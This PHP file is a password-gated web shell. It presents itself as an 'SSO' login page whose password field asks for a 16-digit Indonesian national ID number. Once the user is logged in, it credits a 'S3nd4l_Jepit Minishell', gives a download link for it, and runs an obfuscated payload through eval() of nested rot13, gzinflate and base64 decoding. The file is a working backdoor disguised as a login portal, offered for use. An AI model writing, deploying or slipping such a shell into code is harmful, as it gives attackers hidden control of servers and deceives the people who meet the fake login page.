<?php
session_start();

// Tampilkan error untuk debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Periksa apakah pengguna sudah login
if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
    // Jika sudah login, tampilkan konten utama
    showMainContent();
} else {
    // Jika belum login, tampilkan halaman login
    showLoginPage();
}

function showLoginPage() {
    // Jika pengguna mengirimkan formulir login
    if (isset($_POST['password'])) {
        // Verifikasi password menggunakan bcrypt hashing
        $password = $_POST['password'];
        $storedHash = '$2y$12$o6.g5mJcEAVpLdGw2FYoqunhswh/ClG37zAaeW.gLSJ3z/4qb0NRa'; // Contoh hashed password
        
        if (password_verify($password, $storedHash)) {
            // Simpan status login di session
            $_SESSION['logged_in'] = true;
            
            // Redirect ke halaman utama
            header("Location: ?");
            exit; // Hentikan eksekusi skrip di sini untuk mencegah eksekusi lebih lanjut
        } else {
            // Jika password salah, tampilkan pesan error
            $error = "Password salah!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login SSO | Single Sgin On</title>
    <style>
    body {
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    background-color: #202020;
    }
    
    form {
    background-color: #202020;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    width: 500px;
    }
    
    input[type="password"] {
    width: calc(100% - 20px);
    padding: 10px;
    margin-bottom: 15px;
    border: 1px solid #ddd;
    border-radius: 4px;
    background-color: #8b0000;
    font-size: 16px;
    }
    
    input[type="submit"] {
    width: 100%;
    padding: 10px;
    border: none;
    border-radius: 4px;
    background-color: #8b0000;
    color: white;
    font-size: 16px;
    cursor: pointer;
    }
    
    input[type="submit"]:hover {
    background-color: #8b0000;
    }
    img {
    display: block;
    margin: 0 auto 20px; 
    width: 150px;
    height: 150px;
    border-radius: 50%;
    border: 2px solid #8b0000;
    object-fit: cover;
    }
    </style>
    </head>
    <body>
    <?php echo (isset($error) ? '<p style="color: #8b0000;">'.$error.'</p>' : ''); ?>
    <form method="post" action="">
    <img src="https://media.tenor.com/TcwzV1IM0EcAAAAi/zero-two-ok.gif">
    <input type="password" id="password" name="password" placeholder="Masukan Nik KTP 16 Digit" required><br>
    <input type="submit" value="Login">
    <center><p style="color: white;">Butuh Bantuan? <a href="https://google.com">Hubungi Admin</p></center>
    </form>
    </body>
    </html>
    <?php
    }
    
    function showMainContent() {
    ?>
// S3nd4l_Jepit Minishell
// Jangan ngerecode kalo cuman ganti nama gua doang, tanpa ngembangin fitur didalamnya!
// Download : https://gitlab.com/s3nd4l_jepit/s3nd4l_jepit-minishell/-/raw/master/s3nd4l.php
eval(str_rot13(gzinflate(str_rot13(base64_decode("\123\x49\65\117\x43\64\111\167\107\111\142\x2f\x79\x67\67\103\x48\x4b\147\172\x36\164\123\x6f\x59\x37\x48\60\x46\107\66\130\117\157\x6d\x4b\x2b\x79\160\x75\x32\x55\x6f\165\65\161\x2f\x50\x69\147\x34\144\130\x32\165\x66\x35\63\x30\71\107\x63\165\x59\114\x46\x56\x71\144\61\170\x75\127\x41\x73\53\x37\121\x46\63\x50\145\x66\70\x62\x73\107\x5a\145\x4e\x52\111\101\x39\x66\124\x38\x6a\x5a\x6d\170\122\116\x34\x43\63\70\150\110\106\116\124\71\x2b\x67\x63\104\x32\170\167\114\x6e\x77\167\107\162\x44\x68\141\x75\x74\x44\132\153\x41\116\105\142\x52\x41\155\146\152\x34\x4e\x55\x39\111\x67\53\53\71\x4e\x77\117\x79\171\71\x52\105\162\164\116\120\65\130\141\155\153\153\x64\66\x6b\70\x30\53\x53\x67\107\x5a\115\117\110\x4a\x77\53\70\x54\164\164\150\x39\x43\123\142\167\x65\132\170\103\123\154\147\141\152\121\125\155\130\x67\x3d\x3d")))));
?>